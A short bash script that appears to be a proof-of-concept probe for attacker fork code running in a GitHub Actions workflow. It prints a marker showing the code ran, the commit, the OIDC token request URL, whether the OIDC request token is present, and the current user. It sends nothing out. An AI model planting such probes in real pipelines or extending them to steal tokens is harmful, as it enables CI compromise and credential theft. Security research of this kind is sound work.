#!/usr/bin/env bash
echo "X-EXOTIC|ATTACKER-FORK-CODE-RAN"
echo "X-EXOTIC|head=$(git rev-parse HEAD)"
echo "X-EXOTIC|OIDC_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-EMPTY}"
echo "X-EXOTIC|OIDC_TOKEN_SET=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo yes || echo no)"
echo "X-EXOTIC|whoami=$(whoami)"
